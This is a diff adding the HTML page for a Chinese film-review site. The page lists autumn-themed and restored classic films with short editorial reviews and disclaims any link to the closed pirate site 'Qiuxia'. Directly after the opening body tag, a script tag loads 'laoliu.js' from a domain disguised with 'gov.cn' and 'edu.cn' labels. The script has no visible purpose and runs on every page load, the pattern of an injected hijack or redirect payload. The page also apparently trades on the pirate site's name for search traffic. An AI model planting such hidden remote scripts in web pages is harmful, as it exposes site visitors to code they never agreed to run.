@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>秋色影评电影网 - 秋日光影与老片修复</title>
+<meta name="description" content="秋色影评电影网(qiuxiayingpingdianyingwang-h5)做秋日光影、老片修复、作者电影与短影评片单，移动端自适应，必应收录友好，不提供盗版或软色情内容。">
+<meta name="keywords" content="秋色影评电影网, 秋日电影, 老片修复, 电影短评, 作者电影, 文艺片单">
+<meta name="author" content="秋色影评电影网">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://qiuxiayingpingdianyingwang-h5.github.io/">
+
+<style>
+:root{
+  --autumn:#3a2a1c;
+  --leaf:#c9682f;
+  --leaf2:#e0a458;
+  --maple:#9c3b2e;
+  --cream:#f6efe2;
+  --paper:#f3ead9;
+  --ink:#2c2117;
+  --muted:#8a7458;
+  --line:#d8c6a6;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{-webkit-text-size-adjust:100%}
+body{
+  font-family:"Songti SC","Noto Serif CJK SC","PingFang SC",serif;
+  background:
+    radial-gradient(120% 60% at 90% -10%, rgba(224,164,88,.25), transparent 55%),
+    radial-gradient(120% 70% at 0% 0%, rgba(156,59,46,.18), transparent 55%),
+    linear-gradient(180deg,var(--paper),#efe2cb 60%,#e7d6ba 100%);
+  color:var(--ink);line-height:1.78;
+}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+
+/* 落叶条 */
+.leaf-bar{
+  background:linear-gradient(90deg,var(--maple),var(--leaf),var(--leaf2));
+  color:#fff7ec;text-align:center;font-size:11px;letter-spacing:3px;
+  padding:6px 10px;font-weight:700;font-family:Arial,sans-serif;
+}
+
+/* 头部 */
+.header{max-width:1120px;margin:0 auto;padding:30px 20px 16px;text-align:center}
+.mark{
+  display:inline-flex;align-items:center;gap:14px;
+  padding:12px 24px;border-radius:14px;
+  background:rgba(58,42,28,.06);border:1px solid var(--line);
+}
+.mark .ico{font-size:34px}
+.mark h1{font-size:28px;letter-spacing:4px;color:var(--autumn)}
+.mark .en{font-family:Arial,sans-serif;font-size:11px;color:var(--muted);letter-spacing:2px}
+.header p.slogan{margin-top:12px;color:#6f5a40;font-size:14px}
+
+/* 搜索 */
+.search-wrap{max-width:520px;margin:16px auto 0}
+.search-wrap form{display:flex;height:42px;border-radius:21px;overflow:hidden;border:1px solid var(--line);background:#fbf6ec}
+.search-wrap input{flex:1;border:none;outline:none;background:transparent;padding:0 18px;font-size:13px;color:var(--ink)}
+.search-wrap button{border:none;background:var(--leaf);color:#fff;padding:0 20px;font-weight:700;cursor:pointer}
+
+/* 导航 */
+.nav{max-width:1120px;margin:18px auto 22px;padding:0 20px;display:flex;gap:10px;justify-content:center;flex-wrap:wrap}
+.nav a{padding:7px 16px;border:1px solid var(--line);border-radius:20px;font-size:13px;color:#6f5a40;background:#fbf6ec}
+.nav a:hover,.nav a.active{background:var(--maple);color:#fff;border-color:var(--maple);font-weight:700}
+
+/* 主区 */
+.main{max-width:1120px;margin:0 auto;padding:0 20px 30px}
+
+/* 卷首 */
+.autumn-letter{
+  position:relative;overflow:hidden;
+  background:linear-gradient(135deg,#43301d,#5e4327);
+  color:#f6e7cf;border-left:6px solid var(--leaf2);
+  border-radius:16px;padding:28px 26px;margin-bottom:28px;
+}
+.autumn-letter::after{content:"🍁";position:absolute;right:16px;bottom:-18px;font-size:130px;opacity:.14}
+.autumn-letter .kicker{font-family:Arial,sans-serif;font-size:12px;color:var(--leaf2);letter-spacing:3px}
+.autumn-letter h2{font-size:25px;margin:6px 0 8px;color:#fff}
+.autumn-letter p{color:#ecd9bd;max-width:650px;font-size:14px}
+.autumn-letter .chips{margin-top:14px;display:flex;gap:8px;flex-wrap:wrap}
+.autumn-letter .chips span{padding:4px 12px;border:1px solid #8a6b45;border-radius:20px;font-size:12px;color:var(--leaf2)}
+
+/* 栏目头 */
+.section{margin-bottom:30px}
+.s-head{display:flex;align-items:center;gap:10px;margin-bottom:14px;border-bottom:2px solid var(--line);padding-bottom:8px}
+.s-head .no{width:30px;height:30px;border-radius:6px;background:var(--autumn);color:#f6efe2;display:flex;align-items:center;justify-content:center;font-weight:800}
+.s-head h3{font-size:18px;letter-spacing:1px;color:var(--autumn)}
+.s-head .more{margin-left:auto;font-size:12px;color:var(--maple);font-family:Arial,sans-serif}
+
+/* 栏目一：秋日片单 */
+.leaf-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.leaf-card{
+  background:#fbf6ec;border:1px solid var(--line);
+  border-top:3px solid var(--leaf);
+  border-radius:14px;padding:18px;transition:transform .25s;
+}
+.leaf-card:hover{transform:translateY(-4px)}
+.leaf-card .season{font-size:12px;font-family:Arial,sans-serif;color:var(--muted)}
+.leaf-card h4{font-size:16px;margin:6px 0;color:var(--autumn)}
+.leaf-card .meta{font-size:12px;color:var(--muted);font-family:Arial,sans-serif;margin-bottom:8px}
+.leaf-card p{font-size:13px;color:#4f4031}
+.leaf-card .tag{margin-top:10px;font-size:11px;color:var(--leaf);border:1px solid var(--line);display:inline-block;padding:2px 10px;border-radius:12px}
+
+/* 栏目二：短评列表 */
+.review-list{background:#fbf6ec;border:1px solid var(--line);border-radius:14px;overflow:hidden}
+.review-row{display:flex;gap:14px;padding:14px 16px;border-bottom:1px dashed var(--line);align-items:flex-start}
+.review-row:last-child{border-bottom:none}
+.review-no{width:34px;height:34px;border-radius:50%;background:var(--maple);color:#fff;display:flex;align-items:center;justify-content:center;font-weight:800;flex-shrink:0}
+.review-info h4{font-size:15px;color:var(--autumn)}
+.review-info p{font-size:12px;color:#5d4c39;margin-top:3px}
+.review-score{margin-left:auto;font-size:12px;color:var(--leaf);border:1px solid var(--line);padding:3px 10px;border-radius:12px;white-space:nowrap}
+
+/* 栏目三：修复长廊 横向 */
+.reel-scroll{display:flex;gap:14px;overflow-x:auto;padding-bottom:10px;scroll-snap-type:x mandatory}
+.reel-card{scroll-snap-align:start;flex:0 0 220px;background:#fbf6ec;border:1px solid var(--line);border-radius:14px;overflow:hidden}
+.reel-top{height:80px;display:flex;align-items:center;justify-content:center;font-size:34px;background:linear-gradient(135deg,var(--leaf),#a8531f);color:#fff}
+.reel-card:nth-child(2) .reel-top{background:linear-gradient(135deg,var(--maple),#6f261c)}
+.reel-card:nth-child(3) .reel-top{background:linear-gradient(135deg,var(--leaf2),#9c7322)}
+.reel-card:nth-child(4) .reel-top{background:linear-gradient(135deg,#5e7d5a,#3c573a)}
+.reel-card:nth-child(5) .reel-top{background:linear-gradient(135deg,#7a5ea8,#4f3b73)}
+.reel-body{padding:12px}
+.reel-body h4{font-size:14px;color:var(--autumn);margin-bottom:4px}
+.reel-body p{font-size:11px;color:var(--muted);line-height:1.5}
+
+/* 栏目四：关于 */
+.about{background:#43301d;color:#ecd9bd;border-radius:14px;padding:24px;display:flex;gap:18px;align-items:flex-start;flex-wrap:wrap}
+.about .ico{font-size:38px}
+.about h3{font-size:17px;color:var(--leaf2);margin-bottom:6px}
+.about p{font-size:13px;color:#d8c3a3;max-width:660px}
+.about .url{margin-top:8px;font-family:Arial,sans-serif;font-size:12px;color:var(--leaf2)}
+
+/* 页脚 */
+.footer{margin-top:30px;border-top:3px double var(--line);padding:26px 20px 38px;text-align:center;color:var(--muted);font-size:12px;font-family:Arial,sans-serif}
+.footer a{color:var(--maple)}
+.footer .fn{margin-top:12px;display:flex;justify-content:center;gap:16px;flex-wrap:wrap}
+.footer .fn a{color:var(--muted)}
+.footer .fn a:hover{color:var(--autumn)}
+
+@media(max-width:860px){.leaf-grid{grid-template-columns:repeat(2,1fr)}}
+@media(max-width:640px){
+  .mark h1{font-size:22px}
+  .nav a{padding:6px 12px;font-size:12px}
+  .autumn-letter{padding:20px 16px}
+  .autumn-letter h2{font-size:20px}
+  .main{padding:0 16px 24px}
+  .leaf-grid{grid-template-columns:1fr}
+  .review-row{flex-wrap:wrap}
+  .review-score{margin-left:0}
+  .reel-card{flex-basis:80%}
+  .about{padding:18px 14px}
+}
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="leaf-bar">🍁 秋色影评电影网 · 秋日光影 / 老片修复 / 电影短评 · 单页自适应 · 必应收录友好</div>
+
+<header class="header">
+  <div class="mark">
+    <div class="ico">🍂</div>
+    <div>
+      <h1>秋色影评电影网</h1>
+      <div class="en">qiuxiayingpingdianyingwang-h5 · Autumn Frame Reviews</div>
+    </div>
+  </div>
+  <p class="slogan">秋霞是旧盗版站名；我们做“秋色”——梧桐、落叶、长镜、老片修复，和一句能落地的短评。</p>
+  <div class="search-wrap">
+    <form action="#" method="get">
+      <input type="text" name="q" placeholder="搜 秋日 / 老片修复 / 作者电影 / 侯孝贤 / 小津...">
+      <button type="submit">找评</button>
+    </form>
+  </div>
+</header>
+
+<nav class="nav">
+  <a href="#" class="active">首页</a>
+  <a href="#">秋日片单</a>
+  <a href="#">老片修复</a>
+  <a href="#">作者电影</a>
+  <a href="#">华语文艺</a>
+  <a href="#">欧洲长镜</a>
+  <a href="#">短评墙</a>
+  <a href="#">关于秋色</a>
+</nav>
+
+<div class="main">
+
+  <section class="autumn-letter">
+    <div class="kicker">AUTUMN · ARCHIVE · REVIEWS</div>
+    <h2>秋天适合看慢一点的电影</h2>
+    <p>秋色影评电影网不堆“最新高清资源”，只做可读的片单：秋日气质、老片修复、作者脉络、华语文艺、欧洲长镜。每部片配一句编辑短评；单页静态、移动端自适应、内页 # 占位，不托管未授权视频，不碰“理论片/伦理片”软色情包装。</p>
+    <div class="chips">
+      <span>秋日</span><span>修复</span><span>作者</span><span>长镜</span><span>短评</span>
+    </div>
+  </section>
+
+  <!-- 栏目一 -->
+  <section class="section" id="autumn">
+    <div class="s-head"><span class="no">01</span><h3>秋日片单</h3><a class="more" href="#">全部 #</a></div>
+    <div class="leaf-grid">
+      <article class="leaf-card">
+        <div class="season">SEASON 01 · 梧桐落叶</div>
+        <h4>《恋恋风尘》</h4>
+        <div class="meta">1986 · 台湾 · 侯孝贤</div>
+        <p>车站、军营、信、山雾。初恋不是被撕碎，是被时间慢慢吹凉。</p>
+        <span class="tag"># 侯孝贤 # 青春</span>
+      </article>
+      <article class="leaf-card">
+        <div class="season">SEASON 02 · 东京秋阳</div>
+        <h4>《秋刀鱼之味》</h4>
+        <div class="meta">1962 · 日本 · 小津安二郎</div>
+        <p>女儿要出嫁，父亲在居酒屋说“我啊，还是别老比较好”。家常到骨子里。</p>
+        <span class="tag"># 小津 # 家庭</span>
+      </article>
+      <article class="leaf-card">
+        <div class="season">SEASON 03 · 北方麦田</div>
+        <h4>《黄土地》</h4>
+        <div class="meta">1984 · 大陆 · 陈凯歌</div>
+        <p>黄河、腰鼓、信天游。土地太大，人太小，镜头不肯多说一句。</p>
+        <span class="tag"># 第五代 # 乡土</span>
+      </article>
+      <article class="leaf-card">
+        <div class="season">SEASON 04 · 巴黎长镜</div>
+        <h4>《四百击》</h4>
+        <div class="meta">1959 · 法国 · 特吕弗</div>
+        <p>少年跑向海，镜头停在他脸。新浪潮第一课：孩子不是大人的半成品。</p>
+        <span class="tag"># 新浪潮 # 成长</span>
+      </article>
+      <article class="leaf-card">
+        <div class="season">SEASON 05 · 山间雾气</div>
+        <h4>《路边野餐》</h4>
+        <div class="meta">2015 · 大陆 · 毕赣</div>
+        <p>贵州、火车、40 分钟长镜。时间像水，记不记得住都不重要。</p>
+        <span class="tag"># 毕赣 # 南方</span>
+      </article>
+      <article class="leaf-card">
+        <div class="season">SEASON 06 · 老影院修复</div>
+        <h4>《舞台姐妹》</h4>
+        <div class="meta">1964 / 修复 · 谢晋</div>
+        <p>越剧、戏台、姐妹离散。修复版把胶片上的灰尘擦掉，把时代留下来。</p>
+        <span class="tag"># 修复 # 谢晋</span>
+      </article>
+    </div>
+  </section>
+
+  <!-- 栏目二 -->
+  <section class="section" id="reviews">
+    <div class="s-head"><span class="no">02</span><h3>编辑短评墙</h3><a class="more" href="#">完整 #</a></div>
+    <div class="review-list">
+      <div class="review-row">
+        <div class="review-no">1</div>
+        <div class="review-info"><h4>《悲情城市》</h4><p>“历史不在新闻里，在饭桌、收音机、被带走的那个人身上。”</p></div>
+        <div class="review-score">9.4 / 编辑荐</div>
+      </div>
+      <div class="review-row">
+        <div class="review-no">2</div>
+        <div class="review-info"><h4>《东京物语》</h4><p>“不是孩子不孝，是两代人活进了两套时间。”</p></div>
+        <div class="review-score">9.3 / 慢片王</div>
+      </div>
+      <div class="review-row">
+        <div class="review-no">3</div>
+        <div class="review-info"><h4>《阳光灿烂的日子》</h4><p>“青春期记错的记忆，比真事更诚实。”</p></div>
+        <div class="review-score">9.0 / 华语青春</div>
+      </div>
+      <div class="review-row">
+        <div class="review-no">4</div>
+        <div class="review-info"><h4>《雾中风景》</h4><p>“安哲的路永远走不到，但孩子一直在走。”</p></div>
+        <div class="review-score">8.9 / 欧洲长镜</div>
+      </div>
+      <div class="review-row">
+        <div class="review-no">5</div>
+        <div class="review-info"><h4>《城南旧事》</h4><p>“童年结束得很轻：骆驼队走了，英子不闹了。”</p></div>
+        <div class="review-score">9.1 / 修复必看</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目三 -->
+  <section class="section" id="restore">
+    <div class="s-head"><span class="no">03</span><h3>修复长廊 · 老片抽屉</h3><a class="more" href="#">更多 #</a></div>
+    <div class="reel-scroll">
+      <div class="reel-card"><div class="reel-top">🎞️</div><div class="reel-body"><h4>华语老片修复</h4><p>《神女》《小城之春》《城南旧事》《舞台姐妹》</p></div></div>
+      <div class="reel-card"><div class="reel-top">🏯</div><div class="reel-body"><h4>日本胶片修复</h4><p>《罗生门》《七武士》《东京物语》《晚春》</p></div></div>
+      <div class="reel-card"><div class="reel-top">🗼</div><div class="reel-body"><h4>欧洲新浪潮</h4><p>《广岛之恋》《筋疲力尽》《克莱奥五点到七点》</p></div></div>
+      <div class="reel-card"><div class="reel-top">🌾</div><div class="reel-body"><h4>乡土与第五代</h4><p>《红高粱》《黄土地》《老井》《孩子王》</p></div></div>
+      <div class="reel-card"><div class="reel-top">🎬</div><div class="reel-body"><h4>作者回顾展</h4><p>侯孝贤 / 杨德昌 / 王家卫 / 阿彼察邦</p></div></div>
+    </div>
+  </section>
+
+  <!-- 栏目四 -->
+  <section class="section" id="about">
+    <div class="s-head"><span class="no">04</span><h3>关于秋色</h3></div>
+    <div class="about">
+      <div class="ico">🍁</div>
+      <div>
+        <h3>秋霞是旧盗版站，秋色是影评站</h3>
+        <p>秋色影评电影网（qiuxiayingpingdianyingwang-h5）只做秋日光影、老片修复与电影短评。原“秋霞电影网”因传播淫秽色情、盗版影视被网信办关闭，并出现在国家版权局公布的侵犯著作权案件中；本站不继承其名号、不挂盗版、不写“理论片/伦理片”软色情栏目。[1,5](@ref)</p>
+        <div class="url">https://qiuxiayingpingdianyingwang-h5.github.io</div>
+      </div>
+    </div>
+  </section>
+
+</div>
+
+<footer class="footer">
+  <div>© 2026 秋色影评电影网 | qiuxiayingpingdianyingwang-h5</div>
+  <div>永久地址：<a href="https://qiuxiayingpingdianyingwang-h5.github.io">https://qiuxiayingpingdianyingwang-h5.github.io</a></div>
+  <div>本站为电影推荐/短评/修复片单站，不提供盗版或软色情内容。</div>
+  <div class="fn">
+    <a href="#">首页</a><a href="#">秋日</a><a href="#">修复</a><a href="#">作者</a><a href="#">华语</a><a href="#">欧洲</a><a href="#">关于</a>
+  </div>
+</footer>
+
+</body>
+</html>
